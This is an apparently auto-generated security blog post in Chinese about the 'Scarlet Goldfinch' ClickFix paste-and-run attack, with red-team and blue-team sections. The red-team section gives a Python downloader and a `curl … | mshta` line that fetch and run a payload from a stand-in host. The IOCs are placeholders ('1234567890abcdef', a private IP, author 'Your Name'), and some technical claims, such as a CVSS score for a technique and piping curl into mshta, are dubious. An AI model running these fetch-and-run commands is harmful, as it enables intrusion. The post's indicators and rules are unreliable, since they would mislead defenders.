---
layout: post
title:  "Scarlet Goldfinch’s year in ClickFix"
date:   2026-03-26 18:58:11 +0000
categories: [security]
severity: high
---

# 🔥 解析 Scarlet Goldfinch 攻擊：利用「貼上並執行」技術進行初始存取
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 8.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: `Malicious Copy and Paste`, `T1204.004`, `mshta`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Scarlet Goldfinch 攻擊利用「貼上並執行」技術，通過社交工程手段誘導用戶將惡意代碼貼上並執行，從而實現初始存取。
* **攻擊流程圖解**:
  1. 用戶接收到一條包含惡意代碼的消息或電子郵件。
  2. 用戶被誘導將惡意代碼貼上並執行。
  3. 惡意代碼下載並執行 payload，實現初始存取。
* **受影響元件**: Windows 系統，特別是 Windows 10 和 Windows Server 2019。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 用戶權限，網路位置。
* **Payload 建構邏輯**:

    ```
    
    python
      # 惡意代碼示例
      import os
      import requests
    
      # 下載 payload
      url = "https://example.com/payload.exe"
      response = requests.get(url)
      with open("payload.exe", "wb") as f:
        f.write(response.content)
    
      # 執行 payload
      os.system("payload.exe")
    
    ```
  *範例指令*: `curl https://example.com/payload.exe | mshta`
* **繞過技術**: Scarlet Goldfinch 攻擊使用了多種繞過技術，包括使用 `mshta` 執行 payload，使用 `curl` 下載 payload，使用 `forfiles` 和 `if exist` 命令進行偵測和執行。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | example.com | C:\Windows\Temp\payload.exe |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
      rule Scarlet_Goldfinch {
        meta:
          description = "Scarlet Goldfinch 攻擊偵測"
          author = "Your Name"
        strings:
          $mshta = "mshta"
          $curl = "curl"
        condition:
          $mshta or $curl
      }
    
    ```
  或者是具體的 **SIEM 查詢語法** (Splunk/Elastic):

    ```
    
    sql
      index=security (mshta OR curl) AND (payload.exe OR payload.dll)
    
    ```
* **緩解措施**: 除了更新修補之外，還可以採取以下措施：
  * 禁止用戶執行未知來源的代碼。
  * 限制用戶權限。
  * 監控系統日誌和網路流量。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Malicious Copy and Paste (惡意貼上並執行)**: 想像一個用戶被誘導將惡意代碼貼上並執行，從而實現初始存取。技術上是指攻擊者使用社交工程手段誘導用戶將惡意代碼貼上並執行。
* **T1204.004 (MITRE ATT&CK)**: 惡意貼上並執行技術的 MITRE ATT&CK 編號。
* **mshta (Microsoft HTML Application Host)**: 一個 Windows 系統中的應用程序，用于執行 HTML 應用程序。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://redcanary.com/blog/threat-intelligence/scarlet-goldfinch-clickfix/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/004/)


